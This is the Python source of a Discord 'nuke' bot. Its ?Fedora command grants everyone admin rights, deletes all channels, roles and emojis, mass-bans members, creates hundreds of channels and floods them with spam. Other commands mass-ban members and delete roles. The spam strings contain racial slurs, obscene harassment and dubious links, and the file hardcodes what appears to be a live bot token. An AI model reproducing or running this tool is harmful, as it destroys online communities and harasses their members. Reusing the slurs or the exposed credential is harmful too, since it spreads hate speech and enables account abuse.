import discord
from discord.ext import commands
import random
import os
from discord import Permissions
from colorama import Fore, Style, init
import asyncio

init()

token = "MTQxOTIxNjU5OTM3Nzc3MjY1Ng.GWUE7q.htsL31NeRUCbYReBE8LNigCx5TMSDAIFMOgs90"

SPAM_CHANNEL = ["FUCKED", "Fedora", "ROT WINS", "#Fedora", "1 like", "idk", "oopsies", "#FEDORA OWNS", "DA FYCKING NUKE", "I own you", "Nuked by @@@FEDOR", "Fedora OWNS", "#FUCKED", "WOHOOOO"]
SPAM_MESSAGES = [
    "# @everyone  NUKED BY FEDORA BITCH, YOU WOULD LIKE THIS LINK ---> discord.gg/pornhub",
    "# @everyone  SERVER FUCKING OWNED BITCCCHHHH JFFIREIUHSOIJFOIVJFVJOIJROIJEJRJIRJIRJIRJFIRJFRIJFR REJFEHURIJIRJRJFRIFJRIJRJRFJRIJFRIFJRIFJRIFJRFJR GOT FUCKED 🤯🤯😭😭😭😂😂",
    "# @everyone SERVER GOT NUKED LOSER https://i.guim.co.uk/img/media/327e46c3ab049358fad80575146be9e0e65686e7/0_0_1023_742/master/1023.jpg?width=465&dpr=1&s=none&crop=none",
    "# @everyone FUCK AND DIE V2 discord.gg/c3YJje8J8v https://cdn.discordapp.com/attachments/1341356414492475453/1419223414962520094/images_33.jpg?ex=68d0fa4e&is=68cfa8ce&hm=dc7a061d857bc67b7bf2036e727a3d3eb0ae4beb0db3d733a382c10a0299cafe& 🤯👀👌😭😊",
    "# @everyone Patrick Star is fucking this server (intense goon sound)",
    "# @everyone Rickroll pls click --> https://tinyurl.com/5ckxnvzu",
    "# @everyone yo ts you owner/mods? https://media.discordapp.net/attachments/844696847238692864/1051649159876317214/attachment-7.gif?ex=68d0911a&is=68cf3f9a&hm=349ec33fdcb2544853670d0f1cb2221f7c528ba175eaf1e0b8891d2d001cdbfc&",
    "# @everyone OWNERS SUCK AT DEFENDING THIS SERVER, FUCK YOU!",
    "# @everyone FUCK NIGGERS!",
    "# @everyone #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS #FEDORAOWNS ",
    "# @everyone FEDORA FUCK NIGGERS FUCK NIGGERS FUCK NIGGERS FUCK NIGGERS FUCK NIGGERS"
]

intents = discord.Intents.default()
intents.message_content = True

client = commands.Bot(command_prefix="?", intents=intents)
spam_active = False

@client.event
async def on_ready():
    print(f''' 
   
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣦⣤⣤⣤⣤⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢻⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⣯⢹⣿⣸⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⣿⣿⣀⣶⣷⣼⣿⡿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⢻⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡼⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⢿⣿⣿⢹⣿⣿⡟⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀
⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣍⠀⣿⠿⢿⠀⣿⣿⡜⣿⡿⣿⠙⣿⣿⣻⣿⣿⣿⣿⣿⣿⣿⣇⠀
⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣿⣄⣤⠀⠛⢘⡇⠹⣧⣼⡇⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆
⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡧⣾⣿⣿⠀⣿⡟⣿⠸⣿⣇⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣿⠿⠟⠀⠛⠀⣩⣤⣶⣿⣿⡿⣽⣿⣿⣿⣿⣿⠃
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣴⣶⣶⣶⣿⣿⣿⣿⣿⣿⢿⣾⣿⣿⣿⣿⣿⡟⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⣿⣿⣿⣿⣿⡛⢿⣿⡿⠁⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⡟⠻⣽⣟⡿⣧⡉⢿⣿⡝⣟⢲⣾⠁⠀⠀
⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢏⣿⣿⣿⣿⣿⠉⣿⣿⣿⡇⠀⣷⣾⡿⣦⠘⣷⣯⣾⠟⢰⡄⠛⣷⡿⠃⠀⠀⠀
⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣾⣿⣿⣿⣿⣿⢠⣿⣿⣿⣿⠀⢻⣿⠷⢿⣇⠘⠿⣀⠀⢈⣥⡾⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⡀⠘⣿⠀⠀⢹⡆⠀⣻⣴⠟⠋⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⣾⣿⣿⣿⣿⣧⠀⢻⣤⣴⣶⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⠿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠋⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

If you see the Fedora, it's working
Bot is logged in. User will be: {client.user}

___________________________________________
                                           
Bot created by:                            
         Yaazkidd - True Owner             
         My GF - She's a coder.            
         ItzzVance - idk what dis guy did  
         CurseDew - Yaazkidd roblox user  
__________________________________________


-------------------------------------------

___________________________________________
                                           
Commands on the bot:
      ?Fedora - Nuke the server
      ?STOP - Stop Nuke
      ?ban - Ban all members
      ?rolesfuck - Delete all roles.
      ?ping - Test if bot is working.
___________________________________________



⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⢀⣀⡠⠤⢄⣀⠀⣠⠊⠉⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢻⡟⠉⠀⠀⠀⠀⠀⠉⠁⠀⠀⠀⠙⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠤⠐⠛⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠂⠤⣠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠚⠉⠀⢠⡴⠲⠟⠛⣻⢚⣭⠇⠀⠀⠀⣴⠢⡀⠀⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⣼⣇⠀⠀⠀⢠⣏⠀⠀⠀⠀⠀⠈⠉⠻⠀⠀⠀⡯⠦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠟⠀⠀⢀⡠⢶⣾⣿⢿⡢⠤⣤⣼⣿⣰⡀⠠⡀⠀⢀⣀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⢠⠔⠊⠁⠀⠸⡍⠙⠒⠈⣿⠋⠁⠈⠛⣷⣤⣷⣤⡟⠋⣧⡀⠀⢀⡠⠞⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠚⠯⠽⠿⠭⠅⢳⡀⠀⠀⠿⣄⠀⠀⣀⡾⠻⣿⡿⣏⣱⣿⣟⣉⡑⢄⠀⣸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡇⠀⠀⠐⣾⠍⠉⠁⠀⠀⠈⠁⠈⢉⣸⠏⠉⠛⠫⠴⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⢒⡖⠛⠓⠒⠚⠧⠶⢶⣤⣄⣠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⠞⠓⠈⠱⠂⠐⠒⠒⠒⠒⠛⠋⠉⠉⠉⠉⠉⠛⠢⣕⠢⢄⠀⠀⠀⠀⠀⠈⠉⢑⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠙⠦⣀⠀⠀⣀⢤⡿⠥⠄⢀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡀⠐⠒⠒⠒⠒⠤⢄⣀⢯⡖⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠳⣄⠈⠉⠉⢀⣼⠇⠀⠀⠀⠈⠉⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠋⠀⠀⠀⠀⠀⠀⠀⠈⢹⠁⠀⠀⠀⠀⣼⠋⠉⠉⠉⠉⠉⠉⠉⢉⠧⠀⠀⠀⠀⠀⠀⠀⠀⠈⠣⠴⠚⠉⠉⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠐⠖⣲⣆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡗⠒⠢⠤⢤⣀⡀⠀⠀⠀⠀⠀⠀⢤⣽⣦⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⣯⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠈⠉⠓⡦⠀⠀⠀⠀⢰⢽⠀⠀⠀
⠀⠀⠀⠀⠀⣠⠤⠚⠀⠀⠀⠀⠀⢰⠀⢣⠀⠀⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣄⡼⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠘⡆⠀⠀⠀
⠀⠀⠀⠀⣿⠁⡴⠂⠀⠀⠀⠀⠀⠀⠑⡜⡀⠀⠀⠀⠀⠀⠀⢸⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⢴⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡆⠀⠀⠀⠀⡇⠀⠀⠀
⠀⠀⠀⠀⠈⢺⠁⠀⡔⡆⠀⢰⠋⠢⠴⠃⡇⠀⠀⠀⠀⠀⠀⢸⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⡇⠀⠀⠀
⠀⠐⢢⠀⠀⠀⠑⠊⠀⠳⠤⠊⠀⠀⠀⠀⢁⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠁⠀⠀⠀⠀⠳⣀⠀⠀
⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⡀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⠴⠲⡄⠀⠀⠀⢈⠳⡄
⠀⠀⠀⢰⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⣸⠀⣸⠒⠃
⠀⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠢⠄⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠀⠁⠀⠀

hehe
''')
    await client.change_presence(activity=discord.Game(name="Dick = You"))

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    await client.process_commands(message)

@client.command()
async def ping(ctx):
    await ctx.send("bot working. Got it?")

@client.command()
@commands.is_owner()
async def STOP(ctx):
    global spam_active
    spam_active = False
    await ctx.send("stoopid lol")
    print(Fore.GREEN + f"Spam stopped by {ctx.author}" + Style.RESET_ALL)

async def spam_messages(guild):
    global spam_active
    while spam_active:
        for channel in guild.text_channels:
            if not spam_active:
                break
            try:
                await channel.send(random.choice(SPAM_MESSAGES))
                await asyncio.sleep(0.5)
            except Exception as e:
                print(Fore.RED + f"Failed to sending sm msg {channel.name}: {e}" + Style.RESET_ALL)
        await asyncio.sleep(1)

@client.command()
async def Fedora(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    
    try:
        await guild.edit(name="Fedora owns, Curse wisnss")
        print(Fore.MAGENTA + "server name changed" + Style.RESET_ALL)
    except:
        print(Fore.RED + "Failed to change server name" + Style.RESET_ALL)
    
    try:
        role = discord.utils.get(guild.roles, name="@everyone")
        await role.edit(permissions=Permissions.all())
        print(Fore.MAGENTA + "given everyone admin." + Style.RESET_ALL)
    except:
        print(Fore.RED + "unable to give admin." + Style.RESET_ALL)
    
    for channel in guild.channels:
        try:
            await channel.delete()
            print(Fore.MAGENTA + f"{channel.name} was deleted." + Style.RESET_ALL)
        except:
            print(Fore.RED + f"{channel.name} was NOT deleted." + Style.RESET_ALL)
    
    for member in guild.members:
        if member != ctx.author and member != client.user:
            try:
                await member.ban()
                print(Fore.MAGENTA + f"{member.name} is banned" + Style.RESET_ALL)
            except:
                print(Fore.RED + f"{member.name} is unable to be banned." + Style.RESET_ALL)
    
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(Fore.MAGENTA + f"{role.name} roles deleted" + Style.RESET_ALL)
            except:
                print(Fore.RED + f"{role.name} Has not been deleted" + Style.RESET_ALL)
    
    for emoji in list(ctx.guild.emojis):
        try:
            await emoji.delete()
            print(Fore.MAGENTA + f"{emoji.name} Was deleted" + Style.RESET_ALL)
        except:
            print(Fore.RED + f"{emoji.name} Wasn't Deleted" + Style.RESET_ALL)
    
    global spam_active
    spam_active = True
    
    amount = 500
    for i in range(amount):
        try:
            await guild.create_text_channel(random.choice(SPAM_CHANNEL))
        except:
            pass
    
    
    client.loop.create_task(spam_messages(guild))
    print(f"nuked {guild.name} Successfully.. GPWS GOING DOWN!")

@client.event
async def on_guild_channel_create(channel):
    if channel.type == discord.ChannelType.text and spam_active:
        async def spam_in_channel(ch):
            while spam_active:
                try:
                    await ch.send(random.choice(SPAM_MESSAGES))
                    await asyncio.sleep(1)
                except:
                    await asyncio.sleep(5)
        
        
        client.loop.create_task(spam_in_channel(channel))

@client.command()
async def ban(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for member in guild.members:
        if member != ctx.author and member != client.user:
            try:
                await member.ban()
                print(Fore.MAGENTA + f"{member.name} is banned" + Style.RESET_ALL)
            except:
                print(Fore.RED + f"{member.name} is not banned." + Style.RESET_ALL)
    print("some of the member did not get ban but some have been banned.")

@client.command()
async def rolesfuck(ctx):
    await ctx.message.delete()
    guild = ctx.guild
    for role in guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
                print(Fore.MAGENTA + f"{role.name} rrolesdeleted" + Style.RESET_ALL)
            except:
                print(Fore.RED + f"{role.name} Has not been deleted" + Style.RESET_ALL)
    print("roles deleted, slme dont idc lol.")

try:
    client.run(token)
except discord.LoginFailure:
    print("so if this print, please reset ur bot token or ur bot got deleted")
except Exception as e:
    print("f: error..: {e}")
